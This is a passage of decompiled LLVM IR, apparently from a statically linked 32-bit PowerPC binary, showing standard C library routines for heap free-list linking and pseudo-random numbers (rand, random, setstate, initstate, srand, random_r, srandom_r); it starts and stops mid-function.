  br i1 %v3_10005fb8.lcssa, label %dec_label_pc_10006080, label %dec_label_pc_10005fd0

dec_label_pc_10005fd0:                            ; preds = %dec_label_pc_10005fc8
  %v1_10005fd0 = inttoptr i32 %v0_10006010.lcssa to i32*
  %v2_10005fd0 = load i32, i32* %v1_10005fd0, align 4
  %v2_10005fd4 = sub i32 %v0_10006010.lcssa, %v2_10005fd0
  %v1_10005fd8 = add i32 %v2_10005fd4, 12
  %v3_10005fdc = icmp ugt i32 %v1_10005fd8, %v2_10005fa4
  br i1 %v3_10005fdc, label %dec_label_pc_10006080, label %dec_label_pc_10005fe4

dec_label_pc_10005fe4:                            ; preds = %dec_label_pc_10005fd0
  %v4_10005fdc = icmp eq i32 %v1_10005fd8, %v2_10005fa4
  %v2_10005fe8 = add i32 %v2_10005fd0, %arg3
  store i32 %v2_10005fe8, i32* @r29, align 4
  br i1 %v4_10005fdc, label %dec_label_pc_10005ff0, label %dec_label_pc_10006020

dec_label_pc_10005ff0:                            ; preds = %dec_label_pc_10005fe4
  %v3_10005ff0 = icmp eq i32 %v0_10006004.lcssa, 0
  br i1 %v3_10005ff0, label %dec_label_pc_10006074, label %dec_label_pc_10005ff8

dec_label_pc_10005ff8:                            ; preds = %dec_label_pc_10005ff0
  %v1_10005ff8 = add i32 %v0_10006004.lcssa, 12
  %v4_10005ffc = icmp eq i32 %v1_10005ff8, %arg2
  br i1 %v4_10005ffc, label %dec_label_pc_10006004, label %dec_label_pc_10006074

dec_label_pc_10006004:                            ; preds = %dec_label_pc_10005ff8
  %v1_10006004 = inttoptr i32 %v0_10006004.lcssa to i32*
  %v2_10006004 = load i32, i32* %v1_10006004, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_1000600c = add i32 %v0_10006004.lcssa, 8
  %v2_1000600c = inttoptr i32 %v1_1000600c to i32*
  %v3_1000600c = load i32, i32* %v2_1000600c, align 4
  %v2_10006014 = add i32 %v2_10006004, %v2_10005fe8
  store i32 %v2_10006014, i32* @r29, align 4
  %v5_10006018 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v0_10006010.lcssa, i32 %v3_1000600c, i32 %v2_10005fa4)
  store i32 %v5_10006018, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006074

dec_label_pc_10006020:                            ; preds = %dec_label_pc_10005fe4
  %v1_10006020 = add i32 %v0_10006010.lcssa, 4
  %v2_10006020 = inttoptr i32 %v1_10006020 to i32*
  %v3_10006020 = load i32, i32* %v2_10006020, align 4
  %v3_10006024 = icmp eq i32 %v3_10006020, 0
  br i1 %v3_10006024, label %dec_label_pc_1000605c, label %dec_label_pc_1000602c

dec_label_pc_1000602c:                            ; preds = %dec_label_pc_10006020
  %v1_1000602c = inttoptr i32 %v3_10006020 to i32*
  %v2_1000602c = load i32, i32* %v1_1000602c, align 4
  %v2_10006030 = sub i32 %v3_10006020, %v2_1000602c
  %v1_10006034 = add i32 %v2_10006030, 12
  %v4_10006038 = icmp eq i32 %v2_10005fa4, %v1_10006034
  br i1 %v4_10006038, label %dec_label_pc_10006040, label %dec_label_pc_1000605c

dec_label_pc_10006040:                            ; preds = %dec_label_pc_1000602c
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1000604c = add i32 %v2_1000602c, %v2_10005fe8
  store i32 %v2_1000604c, i32* @r29, align 4
  store i32 %v3_10006020, i32* @r31, align 4
  %v5_10006054 = call i32 @__heap_link_free_area_after(i32* %arg1, i32 %v3_10006020, i32 %v0_10006004.lcssa, i32 %v2_10005fa4)
  store i32 %v5_10006054, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006074

dec_label_pc_1000605c:                            ; preds = %dec_label_pc_1000602c, %dec_label_pc_10006020
  %v2_1000605c = add i32 %v0_10006010.lcssa, %arg3
  store i32 %v2_1000605c, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268460148, i32* @lr, align 4
  %v5_10006070 = call i32 @__heap_link_free_area(i32* %arg1, i32 %v2_1000605c, i32 %v0_10006004.lcssa, i32 %v3_10006020)
  store i32 %v5_10006070, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006074

dec_label_pc_10006074:                            ; preds = %dec_label_pc_10005ff8, %dec_label_pc_10005ff0, %dec_label_pc_10006040, %dec_label_pc_10006004, %dec_label_pc_1000605c
  %v0_10006074 = load i32, i32* @r31, align 4
  store i32 %v0_10006074, i32* @r30, align 4
  %v0_10006078 = load i32, i32* @r29, align 4
  %v2_10006078 = inttoptr i32 %v0_10006074 to i32*
  store i32 %v0_10006078, i32* %v2_10006078, align 4
  br label %dec_label_pc_1000609c

dec_label_pc_10006080:                            ; preds = %dec_label_pc_10005fd0, %dec_label_pc_10005fc8
  %v2_10006080 = add i32 %v2_10005fa4, -12
  %v3_10006080 = inttoptr i32 %v2_10006080 to i32*
  store i32 %arg3, i32* %v3_10006080, align 4
  %v0_10006084 = load i32, i32* %r3.global-to-local, align 4
  %v1_10006084 = add i32 %v0_10006084, -12
  store i32 %v1_10006084, i32* @r30, align 4
  %v0_10006088 = load i32, i32* %r11.global-to-local, align 4
  %v0_1000608c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_1000608c, i32* %r3.global-to-local, align 4
  %v0_10006090 = load i32, i32* @r31, align 4
  store i32 268460188, i32* @lr, align 4
  %v4_10006098 = inttoptr i32 %v0_1000608c to i32*
  %v5_10006098 = call i32 @__heap_link_free_area(i32* %v4_10006098, i32 %v1_10006084, i32 %v0_10006088, i32 %v0_10006090)
  store i32 %v5_10006098, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000609c

dec_label_pc_1000609c:                            ; preds = %dec_label_pc_10006074, %dec_label_pc_10006080
  %v0_100060a0 = load i32, i32* @r30, align 4
  store i32 %v0_100060a0, i32* %r3.global-to-local, align 4
  ret i32 %v0_100060a0

; uselistorder directives
  uselistorder i32 %v3_10006020, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_10005fd8, { 1, 0 }
  uselistorder i32 %v0_10006010.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_10006004.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_10005fb4, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_10005fa4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000609c, { 1, 0 }
  uselistorder label %dec_label_pc_10006074, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10005fb0, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_100060b4 = call i32 @random()
  ret i32 %v0_100060b4

; uselistorder directives
  uselistorder i32 ()* @random, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_100060cc = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_1001d6c8.399 to i32), i32* @r29, align 4
  store i32 %v2_100060cc, i32* @r3, align 4
  %v0_100060e4 = call i32 @__pthread_return_void()
  %v0_100060ec = call i32 @__pthread_return_0()
  %v2_100060f4 = ptrtoint i32* %stack_var_-56 to i32
  %v3_100060fc = call i32 @__GI_random_r(i32* inttoptr (i32 268556000 to i32*), i32 %v2_100060f4)
  store i32 %v2_100060cc, i32* @r3, align 4
  %v0_10006108 = call i32 @__pthread_return_void()
  %v3_10006110 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_10006110
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1001d6c8.399 to i32), i32* %r29.global-to-local, align 4
  %v2_10006148 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006148, i32* @r3, align 4
  %v0_10006150 = call i32 @__pthread_return_void()
  %v0_10006158 = call i32 @__pthread_return_0()
  store i32 268460404, i32* @lr, align 4
  %v3_10006170 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_1001d6e0)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_10006178 = icmp slt i32 %v3_10006170, 0
  store i32 %v2_10006148, i32* @r3, align 4
  br i1 %v1_10006178, label %dec_label_pc_1000618c, label %dec_label_pc_10006188

dec_label_pc_10006188:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1001d6e4.403 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000618c

dec_label_pc_1000618c:                            ; preds = %entry, %dec_label_pc_10006188
  %v0_1000618c = call i32 @__pthread_return_void()
  %v0_10006194 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_10006194

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000618c, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_100061b8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100061b8, i32* @r3, align 4
  %v0_100061e0 = call i32 @__pthread_return_void()
  %v0_100061e8 = call i32 @__pthread_return_0()
  store i32 %arg1, i32* @r3, align 4
  store i32 268460552, i32* @lr, align 4
  %v4_10006204 = inttoptr i32 %arg1 to i32*
  %v5_10006204 = call i32 @__GI_initstate_r(i32* %v4_10006204, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_1001d6e0 to i32))
  store i32 %v2_100061b8, i32* @r3, align 4
  %v0_10006210 = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_1001d6e4.403 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_10006244 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10006244, i32* @r3, align 4
  %v0_10006260 = call i32 @__pthread_return_void()
  %v0_10006268 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_1001d6e0 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268460668, i32* @lr, align 4
  %v0_10006278 = call i32 @srandom_r()
  store i32 %v2_10006244, i32* @r3, align 4
  %v0_10006284 = call i32 @__pthread_return_void()
  ret i32 %v0_10006284

; uselistorder directives
  uselistorder i32* @global_var_1001d6e0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001d6e0 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1000629c = add i32 %tmp, 12
  %v2_1000629c = inttoptr i32 %v1_1000629c to i32*
  %v3_1000629c = load i32, i32* %v2_1000629c, align 4
  store i32 %v3_1000629c, i32* %r11.global-to-local, align 4
  %v0_100062a0 = load i32, i32* @lr, align 4
  store i32 %v0_100062a0, i32* %r0.global-to-local, align 4
  %v1_100062a8 = add i32 %arg1, 4
  store i32 %v1_100062a8, i32* %r3.global-to-local, align 4
  %v3_100062ac = icmp eq i32 %v3_1000629c, 0
  %v1_100062b0 = add i32 %tmp, 8
  %v2_100062b0 = inttoptr i32 %v1_100062b0 to i32*
  %v3_100062b0 = load i32, i32* %v2_100062b0, align 4
  store i32 %v3_100062b0, i32* %r9.global-to-local, align 4
  br i1 %v3_100062ac, label %dec_label_pc_100062bc, label %dec_label_pc_100062c4

dec_label_pc_100062bc:                            ; preds = %entry
  %v2_100062bc = add i32 %v3_100062b0, -4
  %v3_100062bc = inttoptr i32 %v2_100062bc to i32*
  store i32 0, i32* %v3_100062bc, align 4
  br label %dec_label_pc_100062dc

dec_label_pc_100062c4:                            ; preds = %entry
  %v1_100062c4 = add i32 %tmp, 4
  %v2_100062c4 = inttoptr i32 %v1_100062c4 to i32*
  %v3_100062c4 = load i32, i32* %v2_100062c4, align 4
  %v2_100062c8 = sub i32 %v3_100062c4, %v3_100062b0
  %v4_100062cc = sdiv i32 %v2_100062c8, 4
  %v1_100062d0 = mul i32 %v4_100062cc, 5
  %v2_100062d4 = add i32 %v1_100062d0, %v3_1000629c
  store i32 %v2_100062d4, i32* %r0.global-to-local, align 4
  %v2_100062d8 = add i32 %v3_100062b0, -4
  %v3_100062d8 = inttoptr i32 %v2_100062d8 to i32*
  store i32 %v2_100062d4, i32* %v3_100062d8, align 4
  br label %dec_label_pc_100062dc

dec_label_pc_100062dc:                            ; preds = %dec_label_pc_100062bc, %dec_label_pc_100062c4
  %v0_100062dc = load i32, i32* %r3.global-to-local, align 4
  %v1_100062dc = add i32 %v0_100062dc, -4
  %v2_100062dc = inttoptr i32 %v1_100062dc to i32*
  %v3_100062dc = load i32, i32* %v2_100062dc, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000c8d4.404 to i32), i32* %r9.global-to-local, align 4
  %v2_100062ec = srem i32 %v3_100062dc, 5
  store i32 %v2_100062ec, i32* %r11.global-to-local, align 4
  %v2_100062fc = icmp ugt i32 %v2_100062ec, 4
  %v1_10006300 = mul nsw i32 %v2_100062ec, 4
  store i32 %v1_10006300, i32* %r0.global-to-local, align 4
  %v2_10006308 = add i32 %v1_10006300, ptrtoint (i32* @global_var_1000c8d4.404 to i32)
  store i32 %v2_10006308, i32* %r10.global-to-local, align 4
  br i1 %v2_100062fc, label %dec_label_pc_1000636c, label %dec_label_pc_10006310

dec_label_pc_10006310:                            ; preds = %dec_label_pc_100062dc
  %v3_10006304 = icmp eq i32 %v2_100062ec, 0
  %v1_10006310 = add i32 %v1_10006300, add (i32 ptrtoint (i32* @global_var_1000c8d4.404 to i32), i32 20)
  %v2_10006310 = inttoptr i32 %v1_10006310 to i32*
  %v3_10006310 = load i32, i32* %v2_10006310, align 4
  store i32 %v3_10006310, i32* %r10.global-to-local, align 4
  %v3_10006314 = inttoptr i32 %v2_10006308 to i32*
  %v4_10006314 = load i32, i32* %v3_10006314, align 4
  store i32 %v4_10006314, i32* %r9.global-to-local, align 4
  %v1_10006318 = mul i32 %v3_10006310, 4
  store i32 %v1_10006318, i32* %r0.global-to-local, align 4
  %v2_1000631c = add i32 %tmp, 16
  %v3_1000631c = inttoptr i32 %v2_1000631c to i32*
  store i32 %v3_10006310, i32* %v3_1000631c, align 4
  %v0_10006320 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006320 = add i32 %tmp, 20
  %v3_10006320 = inttoptr i32 %v2_10006320 to i32*
  store i32 %v0_10006320, i32* %v3_10006320, align 4
  %v0_10006324 = load i32, i32* %r3.global-to-local, align 4
  %v1_10006324 = load i32, i32* %r0.global-to-local, align 4
  %v2_10006324 = add i32 %v1_10006324, %v0_10006324
  store i32 %v2_10006324, i32* %r8.global-to-local, align 4
  %v0_10006328 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10006328, i32* %v2_1000629c, align 4
  br i1 %v3_10006304, label %dec_label_pc_10006360, label %dec_label_pc_10006330

dec_label_pc_10006330:                            ; preds = %dec_label_pc_10006310
  %v0_10006330 = load i32, i32* %r3.global-to-local, align 4
  %v1_10006330 = add i32 %v0_10006330, -4
  %v2_10006330 = inttoptr i32 %v1_10006330 to i32*
  %v3_10006330 = load i32, i32* %v2_10006330, align 4
  %v1_10006334 = load i32, i32* %r7.global-to-local, align 4
  %v2_10006334 = sdiv i32 %v3_10006330, %v1_10006334
  %v1_10006338 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006338 = add i32 %v1_10006338, %v2_10006334
  store i32 %v2_10006338, i32* %r9.global-to-local, align 4
  %v1_1000633c = mul i32 %v2_10006334, 4
  %v1_10006340 = load i32, i32* %r10.global-to-local, align 4
  %v2_10006340 = sdiv i32 %v2_10006338, %v1_10006340
  store i32 %v2_10006340, i32* %r11.global-to-local, align 4
  %v2_10006344 = add i32 %v1_1000633c, %v0_10006330
  store i32 %v2_10006344, i32* %r0.global-to-local, align 4
  %v2_10006348 = add i32 %tmp, 4
  %v3_10006348 = inttoptr i32 %v2_10006348 to i32*
  store i32 %v2_10006344, i32* %v3_10006348, align 4
  %v0_1000634c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000634c = load i32, i32* %r10.global-to-local, align 4
  %v2_1000634c = mul i32 %v1_1000634c, %v0_1000634c
  store i32 %v2_1000634c, i32* %r11.global-to-local, align 4
  %v1_10006350 = load i32, i32* %r9.global-to-local, align 4
  %v2_10006350 = sub i32 %v1_10006350, %v2_1000634c
  %v1_10006354 = mul i32 %v2_10006350, 4
  %v0_10006358 = load i32, i32* %r3.global-to-local, align 4
  %v2_10006358 = add i32 %v1_10006354, %v0_10006358
  store i32 %v2_10006358, i32* %r9.global-to-local, align 4
  store i32 %v2_10006358, i32* %arg2, align 4
  br label %dec_label_pc_10006360

dec_label_pc_10006360:                            ; preds = %dec_label_pc_10006310, %dec_label_pc_10006330
  %v0_10006360 = load i32, i32* %r8.global-to-local, align 4
  %v2_10006360 = add i32 %tmp, 24
  %v3_10006360 = inttoptr i32 %v2_10006360 to i32*
  store i32 %v0_10006360, i32* %v3_10006360, align 4
  %v0_10006364 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10006364, i32* %v2_100062b0, align 4
  %v0_10006380.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000637c

dec_label_pc_1000636c:                            ; preds = %dec_label_pc_100062dc
  %v0_1000636c = call i32 @__errno_location()
  store i32 %v0_1000636c, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10006374 = inttoptr i32 %v0_1000636c to i32*
  store i32 22, i32* %v2_10006374, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1000637c

dec_label_pc_1000637c:                            ; preds = %dec_label_pc_10006360, %dec_label_pc_1000636c
  %v0_10006380 = phi i32 [ %v0_10006380.pre, %dec_label_pc_10006360 ], [ -1, %dec_label_pc_1000636c ]
  store i32 %v0_100062a0, i32* %r0.global-to-local, align 4
  store i32 %v0_10006380, i32* %r3.global-to-local, align 4
  ret i32 %v0_10006380

; uselistorder directives
  uselistorder i32 %v0_10006380, { 1, 0 }
  uselistorder i32 %v3_10006310, { 1, 0, 2 }
  uselistorder i32 %v1_10006300, { 2, 1, 0 }
  uselistorder i32 %v2_100062ec, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 7, 5, 6, 8, 0 }
  uselistorder label %dec_label_pc_1000637c, { 1, 0 }
  uselistorder label %dec_label_pc_10006360, { 1, 0 }
  uselistorder label %dec_label_pc_100062dc, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10006390 = add i32 %tmp, 12
  %v2_10006390 = inttoptr i32 %v1_10006390 to i32*
  %v3_10006390 = load i32, i32* %v2_10006390, align 4
  %v1_1000639c = add i32 %tmp, 8
  %v2_1000639c = inttoptr i32 %v1_1000639c to i32*
  %v3_1000639c = load i32, i32* %v2_1000639c, align 4
  store i32 %v3_1000639c, i32* %r7.global-to-local, align 4
  %v3_100063a0 = icmp eq i32 %v3_10006390, 0
  br i1 %v3_100063a0, label %dec_label_pc_100063a8, label %dec_label_pc_100063c4

dec_label_pc_100063a8:                            ; preds = %entry
  %v1_100063a8 = inttoptr i32 %v3_1000639c to i32*
  %v2_100063a8 = load i32, i32* %v1_100063a8, align 4
  %v2_100063ac = mul i32 %v2_100063a8, 1103515245
  %v1_100063b0 = add i32 %v2_100063ac, 12345
  %v1_100063b4 = urem i32 %v1_100063b0, -2147483648
  store i32 %v1_100063b4, i32* %r9.global-to-local, align 4
  store i32 %v1_100063b4, i32* %v1_100063a8, align 4
  %v0_100063bc = load i32, i32* %r9.global-to-local, align 4
  %v2_100063bc = inttoptr i32 %arg2 to i32*
  store i32 %v0_100063bc, i32* %v2_100063bc, align 4
  br label %dec_label_pc_10006418

dec_label_pc_100063c4:                            ; preds = %entry
  %v2_100063c4 = load i32, i32* %arg1, align 4
  %v1_100063c8 = add i32 %tmp, 4
  %v2_100063c8 = inttoptr i32 %v1_100063c8 to i32*
  %v3_100063c8 = load i32, i32* %v2_100063c8, align 4
  store i32 %v3_100063c8, i32* %r9.global-to-local, align 4
  %v1_100063cc = add i32 %tmp, 24
  %v2_100063cc = inttoptr i32 %v1_100063cc to i32*
  %v3_100063cc = load i32, i32* %v2_100063cc, align 4
  %v1_100063d0 = add i32 %v2_100063c4, 4
  store i32 %v1_100063d0, i32* %r8.global-to-local, align 4
  %v1_100063d4 = add i32 %v3_100063c8, 4
  %v1_100063d8 = inttoptr i32 %v3_100063c8 to i32*
  %v2_100063d8 = load i32, i32* %v1_100063d8, align 4
  store i32 %v2_100063d8, i32* %r9.global-to-local, align 4
  %v2_100063dc = icmp ult i32 %v1_100063d0, %v3_100063cc
  %v1_100063e4 = inttoptr i32 %v2_100063c4 to i32*
  %v2_100063e4 = load i32, i32* %v1_100063e4, align 4
  store i32 %v1_100063d4, i32* %r10.global-to-local, align 4
  %v2_100063ec = add i32 %v2_100063e4, %v2_100063d8
  %v1_100063f0 = udiv i32 %v2_100063ec, 2
  store i32 %v1_100063f0, i32* %r9.global-to-local, align 4
  store i32 %v2_100063ec, i32* %v1_100063e4, align 4
  %v0_100063f8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100063f8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_100063f8, i32* %v2_100063f8, align 4
  br i1 %v2_100063dc, label %dec_label_pc_10006408, label %dec_label_pc_10006400

dec_label_pc_10006400:                            ; preds = %dec_label_pc_100063c4
  %v0_10006400 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10006400, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10006410

dec_label_pc_10006408:                            ; preds = %dec_label_pc_100063c4
  %v2_100063e0 = icmp ult i32 %v1_100063d4, %v3_100063cc
  br i1 %v2_100063e0, label %dec_label_pc_10006410, label %dec_label_pc_1000640c

dec_label_pc_1000640c:                            ; preds = %dec_label_pc_10006408
  %v0_1000640c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1000640c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10006410

dec_label_pc_10006410:                            ; preds = %dec_label_pc_10006408, %dec_label_pc_10006400, %dec_label_pc_1000640c
  %v0_10006410 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10006410, i32* %v2_100063c8, align 4
  %v0_10006414 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10006414, i32* %arg1, align 4
  br label %dec_label_pc_10006418

dec_label_pc_10006418:                            ; preds = %dec_label_pc_100063a8, %dec_label_pc_10006410
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100063ec, { 1, 0 }
  uselistorder i32 %v1_100063d4, { 1, 0 }
  uselistorder i32 %v3_100063c8, { 1, 0, 2 }
  uselistorder i32 %v1_100063b4, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006418, { 1, 0 }
  uselistorder label %dec_label_pc_10006410, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10006420 = load i32, i32* @lr, align 4
  %v0_1000642c = load i32, i32* @r4, align 4
  store i32 %v0_1000642c, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10006438 = add i32 %v0_1000642c, 12
  %v2_10006438 = inttoptr i32 %v1_10006438 to i32*
  %v3_10006438 = load i32, i32* %v2_10006438, align 4
  %v2_1000643c = icmp ugt i32 %v3_10006438, 4
  br i1 %v2_1000643c, label %dec_label_pc_100064ec, label %dec_label_pc_10006444

dec_label_pc_10006444:                            ; preds = %entry
  %v0_10006444 = load i32, i32* @r3, align 4
  %v3_10006444 = icmp eq i32 %v0_10006444, 0
  %v1_10006448 = add i32 %v0_1000642c, 8
  %v2_10006448 = inttoptr i32 %v1_10006448 to i32*
  %v3_10006448 = load i32, i32* %v2_10006448, align 4
  store i32 %v3_10006448, i32* %r10.global-to-local, align 4
  br i1 %v3_10006444, label %dec_label_pc_10006450, label %dec_label_pc_10006454

dec_label_pc_10006450:                            ; preds = %dec_label_pc_10006444
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_10006454

dec_label_pc_10006454:                            ; preds = %dec_label_pc_10006444, %dec_label_pc_10006450
  %v0_10006458 = phi i32 [ %v0_10006444, %dec_label_pc_10006444 ], [ 1, %dec_label_pc_10006450 ]
  %v3_10006454 = icmp eq i32 %v3_10006438, 0
  %v2_10006458 = inttoptr i32 %v3_10006448 to i32*
  store i32 %v0_10006458, i32* %v2_10006458, align 4
  br i1 %v3_10006454, label %dec_label_pc_100064e8, label %dec_label_pc_10006460

dec_label_pc_10006460:                            ; preds = %dec_label_pc_10006454
  %v0_10006460 = load i32, i32* @r30, align 4
  %v1_10006460 = add i32 %v0_10006460, 16
  %v2_10006460 = inttoptr i32 %v1_10006460 to i32*
  %v3_10006460 = load i32, i32* %v2_10006460, align 4
  store i32 %v3_10006460, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10006478 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_10006460, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_10006460, 0
  br i1 %tmp18, label %dec_label_pc_100064b4.preheader, label %dec_label_pc_100064b4.preheader.thread

dec_label_pc_100064b4.preheader.thread:           ; preds = %dec_label_pc_10006460
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100064b8

dec_label_pc_100064b4.preheader:                  ; preds = %dec_label_pc_10006460
  %v1_100064b42 = add i32 %v3_10006460, -1
  store i32 %v1_100064b42, i32* %ctr.global-to-local, align 4
  %v2_100064b43 = icmp eq i32 %v1_100064b42, 0
  br i1 %v2_100064b43, label %dec_label_pc_100064b8, label %dec_label_pc_10006490

dec_label_pc_10006490:                            ; preds = %dec_label_pc_100064b4.preheader, %dec_label_pc_100064b0.dec_label_pc_10006490_crit_edge
  %v1_100064b0 = phi i32 [ %v2_100064b0, %dec_label_pc_100064b0.dec_label_pc_10006490_crit_edge ], [ %v0_10006478, %dec_label_pc_100064b4.preheader ]
  %v1_10006490 = phi i32 [ %v1_10006490.pre, %dec_label_pc_100064b0.dec_label_pc_10006490_crit_edge ], [ 127773, %dec_label_pc_100064b4.preheader ]
  %v0_10006490 = load i32, i32* @r3, align 4
  %v2_10006490 = sdiv i32 %v0_10006490, %v1_10006490
  %v2_10006494 = mul i32 %v2_10006490, %v1_10006490
  %v2_10006498 = sub i32 %v0_10006490, %v2_10006494
  %v1_1000649c = mul i32 %v2_10006490, 2836
  store i32 %v1_1000649c, i32* %r0.global-to-local, align 4
  %v1_100064a0 = mul i32 %v2_10006498, 16807
  %v2_100064a4 = sub i32 %v1_100064a0, %v1_1000649c
  store i32 %v2_100064a4, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_100064a4, -1
  br i1 %tmp19, label %dec_label_pc_100064b0, label %dec_label_pc_100064ac

dec_label_pc_100064ac:                            ; preds = %dec_label_pc_10006490
  %v1_100064ac = load i32, i32* %r7.global-to-local, align 4
  %v2_100064ac = add i32 %v1_100064ac, %v2_100064a4
  store i32 %v2_100064ac, i32* @r3, align 4
  br label %dec_label_pc_100064b0

dec_label_pc_100064b0:                            ; preds = %dec_label_pc_10006490, %dec_label_pc_100064ac
  %v0_100064b0 = phi i32 [ %v2_100064a4, %dec_label_pc_10006490 ], [ %v2_100064ac, %dec_label_pc_100064ac ]
  %v2_100064b0 = add i32 %v1_100064b0, 4
  %v3_100064b0 = inttoptr i32 %v2_100064b0 to i32*
  store i32 %v0_100064b0, i32* %v3_100064b0, align 4
  %v0_100064b4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100064b4 = add i32 %v0_100064b4, -1
